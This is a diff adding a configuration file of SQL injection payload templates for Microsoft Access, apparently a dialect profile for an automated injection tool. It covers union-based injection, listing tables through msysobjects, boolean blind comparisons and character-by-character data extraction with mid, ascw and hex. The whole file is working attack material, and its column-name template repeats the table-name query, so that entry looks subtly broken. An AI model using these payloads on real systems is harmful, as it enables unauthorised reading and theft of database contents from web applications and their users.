@@ -1,0 +1,29 @@
+exists_table: exists(select 1 from {table})
+exists_column: exists(select {cols} from {table})
+UnionFillStr:1
+UnionAll:1=2 union all select {cols}
+UnionData:1=2 union all select {cols} from {table}{where}
+BoolData:{expr}>{value}
+DataSplitStr:_s_p_
+DataStartStr:data_
+DataEndStr:_data
+DBCount:1
+TableCount:(select count(1) from msysobjects where type=1)
+ColumnCount:1
+DBName:Access
+DBNames:Access
+TableName:(select top 1 name from (select top {index} name from msysobjects where type=1 order by name) t order by t.name desc)
+TableNames:Access
+ColumnName:(select top 1 name from (select top {index} name from msysobjects where type=1 order by name) t order by t.name desc)
+ColumnNames:Access
+Substr:mid(({expr}),{start},{len})
+Concat:{startMark}&{split}&{cols}&{split}&{endMark}
+Length:len({expr})
+Cast:cstr({expr})
+IfNull:iif(isnull({expr}),chr(32),{expr})
+Ascii:ascw({expr})
+Hex:hex({expr})
+DataValue:(select top 1 {cols} from (select top {rowIndex} {cols} from {table}{where} order by 1) t order by 1 desc)
+DataCount:(select count(1) from {table}{where})
+BlindStrategy: unicodechar
+DnsChannel: no
